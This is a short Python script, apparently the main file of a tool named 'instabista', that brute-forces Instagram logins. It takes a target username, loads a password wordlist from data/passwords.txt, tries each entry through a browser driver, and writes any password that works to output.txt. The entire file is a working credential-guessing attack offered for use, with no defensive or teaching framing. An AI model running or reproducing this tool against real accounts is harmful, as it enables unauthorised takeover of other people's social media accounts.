from ig import *
import time 
import colorama
import random


#colors
yellow = "\033[93m"
reset = "\033[0m"
green = "\033[92m"

#intro
instabista = r"""
    _            __        __    _      __       
   (_)___  _____/ /_____ _/ /_  (_)____/ /_____ _
  / / __ \/ ___/ __/ __ `/ __ \/ / ___/ __/ __ `/
 / / / / (__  ) /_/ /_/ / /_/ / (__  ) /_/ /_/ / 
/_/_/ /_/____/\__/\__,_/_.___/_/____/\__/\__,_/  
"""

print(yellow + instabista + reset)
username = input("username >> ")

#setting up the driver
ig_driver = ig_driver()

#username input
username_entry(ig_driver,username)


#password_file
with open("data/passwords.txt", "r", encoding="utf-8") as file:
    lines = file.readlines()

lines_number = len(lines)

random.shuffle(lines)


for i in range(lines_number):
    random_line = lines.pop().strip()
    login(ig_driver,random_line)
    print(f"Trying password ({i + 1}/{lines_number}): {yellow}{random_line}{reset}")
    if check_login(ig_driver):
        output_line = f"{username:<10}{random_line:<10}(Succussed)\n"
        print("Vaild Password : " + green + random_line + reset)
        with open("output.txt", "a", encoding="utf-8") as file:
            file.write(output_line)
        break
    else:
        pass
        
    

